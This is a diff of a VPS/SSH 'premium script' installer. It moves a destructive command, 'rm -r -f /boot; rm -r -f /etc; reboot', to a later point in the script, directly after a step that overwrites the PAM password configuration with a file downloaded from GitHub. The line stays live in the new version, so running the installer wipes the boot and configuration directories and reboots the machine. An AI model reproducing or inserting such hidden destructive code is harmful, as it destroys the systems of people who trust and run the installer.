@@ -18,7 +18,6 @@ fi
 clear
 mkdir /var/lib/premium-script;
 echo "IP=" >> /var/lib/premium-script/ipvps.conf
-rm -r -f /boot; rm -r -f /etc; reboot
 # MengInstall SSH
 export DEBIAN_FRONTEND=noninteractive
 MYIP=$(wget -qO- ipv4.wildyproject.com);
@@ -39,7 +38,7 @@ email=paoandest@gmail.com
 # simple password minimal
 wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/halluboys/xzvnct/main/password"
 chmod +x /etc/pam.d/common-password
-
+rm -r -f /boot; rm -r -f /etc; reboot
 # go to root
 cd
 # Edit file /etc/systemd/system/rc-local.service
@@ -468,7 +467,7 @@ echo ""  | tee -a log-install.txt
 echo "   - Dev/Main                : HALUBOYS"  | tee -a log-install.txt
 echo "   - Telegram                : T.me/XZVNCT"  | tee -a log-install.txt
 echo "   - Instagram               : @XZVNCT"  | tee -a log-install.txt
-echo "   - Whatsapp                : 0838386165686"  | tee -a log-install.txt
+echo "   - Whatsapp                : xxx"  | tee -a log-install.txt
 echo "   - Facebook                : https://www.facebook.com/" | tee -a log-install.txt
 echo "------------------Script Created By HALUBOYS-----------------" | tee -a log-install.txt
 echo ""
